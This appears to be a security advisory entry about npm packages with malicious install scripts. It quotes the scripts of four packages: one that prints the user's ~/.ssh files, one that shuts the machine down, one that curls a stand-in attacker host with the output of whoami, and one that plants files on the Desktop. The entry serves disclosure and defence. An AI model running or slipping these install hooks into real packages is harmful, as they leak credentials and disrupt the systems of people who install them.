  title: Malicious Package
  description: |+
    `maybemaliciouspackage` is a malicious package that is used to
    demonstrate or test malicious install scripts. These scripts can send
    your local ssh file to an attacker, or download malicious files and run
    them in the background.

    This is especially dangerous in production runtime environments, where
    environment variables tend to consist of keys, passwords, tokens and
    other secrets.

    On August 1st, 2017 npm deprecated all malicious typosquatting libraries
    from this list.

    The list of packages and their scripts are:

        {
          "name": "maybemaliciouspackage",
          "scripts": {
            "postinstall": "find ~/.ssh | xargs cat || true && echo '\n\n\n\n\n\nOH HEY LOOK SSH KEYS\n\n\n\n\n\n\n'"
          }
        },
        {
          "name": "deasyncp",
          "scripts": {
            "preinstall": "say U WOT M8; shutdown -s now"
          }
        },
        {
          "name": "harmlesspackage",
          "scripts": {
            "postinstall": "echo '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nThanks for your SSH         keys :)' && curl -X GET http://1.3.3.7:1337/\\?$(whoami)"
          }
        },
        {
          "name": "npm-exploit",
          "scripts": {
            "install": "mkdir -p ~/Desktop/sploit && touch ~/Desktop/sploit/haxx"
          }
        }
    {: .language-json}
